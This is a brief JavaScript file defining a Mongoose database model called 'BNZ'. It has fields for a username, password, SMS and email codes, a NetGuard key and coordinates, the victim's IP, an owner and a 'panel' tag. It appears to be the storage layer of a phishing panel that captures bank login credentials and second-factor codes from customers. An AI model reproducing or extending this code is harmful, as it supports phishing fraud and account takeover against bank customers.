const mongoose = require("mongoose");

const bnzSchema = new mongoose.Schema({
    uniqueid: String,
    username: String,
    password: String,
    smsCode: String,
    emailCode: String,
    netguardKey: String,
    ngcoord1: String,
    ngcoord2: String,
    ngcoord3: String,
    status: Number,
    ip: String,
    owner: String,
    panel: { type: 'string', default: 'bnz' }
});

module.exports = mongoose.model("BNZ", bnzSchema);
